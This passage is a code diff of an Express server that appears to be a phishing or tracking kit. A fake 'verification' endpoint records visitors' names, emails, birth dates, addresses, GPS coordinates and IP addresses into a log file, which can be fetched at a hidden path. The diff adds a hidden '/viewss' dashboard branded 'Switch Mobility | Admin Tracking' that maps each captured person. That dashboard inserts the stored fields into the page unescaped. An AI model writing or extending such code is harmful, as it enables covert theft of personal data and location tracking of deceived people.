@@ -5,24 +5,21 @@ const bodyParser = require("body-parser");
 
 const app = express();
 const PORT = 4000;
-const SECRET_PATH = "/sssss"; // 🔐 Secret log path
+const SECRET_PATH = "/sssss"; // JSON Download
+const VIEW_PATH = "/viewss";   // Visual Dashboard
 const LOG_FILE = path.join(__dirname, "logs.json");
 
-// Middleware
 app.use(bodyParser.json());
 
-// Ensure logs.json exists
 if (!fs.existsSync(LOG_FILE)) {
   fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
 }
 
-// --- HELPER: SAVE LOGS ---
 function saveLog(entry) {
   try {
     const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
     logs.push(entry);
     fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
-    console.log(`[LOG] Data saved for: ${entry.userData.name}`);
   } catch (err) {
     console.error("Error saving log:", err);
   }
@@ -269,34 +266,96 @@ app.get("/", (req, res) => {
   `);
 });
 
-// --- ROUTE 2: API TO SAVE DATA ---
-app.post("/api/submit-verification", async (req, res) => {
+app.post("/api/submit-verification", (req, res) => {
   const { name, email, dob, address, zipCode, latitude, longitude } = req.body;
-
-  // Get IP Info
   const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
   
-  const logEntry = {
-    timestamp: new Date().toISOString(),
-    userData: {
-        name,
-        email,
-        dob,
-        input_address: address,
-        input_zip: zipCode
-    },
-    gps_data: {
-        lat: latitude,
-        lon: longitude
-    },
-    network_info: {
-        ip: ip,
-        userAgent: req.headers["user-agent"]
-    }
-  };
-
-  saveLog(logEntry);
+  saveLog({
+    timestamp: new Date().toLocaleString(),
+    userData: { name, email, dob, address, zipCode },
+    gps: { lat: latitude, lon: longitude },
+    ip
+  });
   res.json({ success: true });
+});
+
+// --- ROUTE 3: READABLE DATA VIEW WITH MAP (/viewss) ---
+app.get(VIEW_PATH, (req, res) => {
+  const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
+
+  res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Switch Mobility | Admin Tracking</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; height: 100vh; background: #f4f4f4; }
+        #sidebar { width: 400px; overflow-y: auto; background: white; border-right: 1px solid #ddd; padding: 20px; box-shadow: 2px 0 5px rgba(0,0,0,0.1); z-index: 1000; }
+        #map { flex-grow: 1; z-index: 1; }
+        .log-card { background: #fff; border: 1px solid #eee; border-radius: 8px; padding: 15px; margin-bottom: 15px; cursor: pointer; transition: 0.2s; border-left: 5px solid #0056b3; }
+        .log-card:hover { background: #f0f7ff; transform: translateY(-2px); }
+        .log-card h4 { margin: 0 0 5px 0; color: #0056b3; }
+        .log-card p { margin: 3px 0; font-size: 13px; color: #555; }
+        .header { margin-bottom: 20px; border-bottom: 2px solid #0056b3; padding-bottom: 10px; }
+        .tag { font-size: 10px; background: #eee; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div id="sidebar">
+    <div class="header">
+        <h3>Live Fleet Logs</h3>
+        <p style="font-size: 12px; color: #888;">Switch Mobility Admin Portal</p>
+    </div>
+    <div id="logList"></div>
+</div>
+
+<div id="map"></div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+    const data = ${JSON.stringify(logs)};
+    const map = L.map('map').setView([28.6139, 77.2090], 10); // Center on Delhi
+
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap contributors'
+    }).addTo(map);
+
+    const logList = document.getElementById('logList');
+
+    data.reverse().forEach((log, index) => {
+        // Add Marker to Map
+        const marker = L.marker([log.gps.lat, log.gps.lon]).addTo(map)
+            .bindPopup(\`<b>\${log.userData.name}</b><br>\${log.userData.address}\`);
+
+        // Add Card to Sidebar
+        const card = document.createElement('div');
+        card.className = 'log-card';
+        card.innerHTML = \`
+            <h4>\${log.userData.name} <span class="tag">VERIFIED</span></h4>
+            <p><strong>Email:</strong> \${log.userData.email}</p>
+            <p><strong>Address:</strong> \${log.userData.address}</p>
+            <p><strong>Captured:</strong> \${log.timestamp}</p>
+            <p style="font-size:11px; color:#999;">GPS: \${log.gps.lat.toFixed(4)}, \${log.gps.lon.toFixed(4)}</p>
+        \`;
+        
+        card.onclick = () => {
+            map.flyTo([log.gps.lat, log.gps.lon], 15);
+            marker.openPopup();
+        };
+        
+        logList.appendChild(card);
+    });
+
+    if(data.length > 0) {
+        map.panTo([data[0].gps.lat, data[0].gps.lon]);
+    }
+</script>
+
+</body>
+</html>
+  `);
 });
 
 // --- ROUTE 3: DOWNLOAD PDF ---
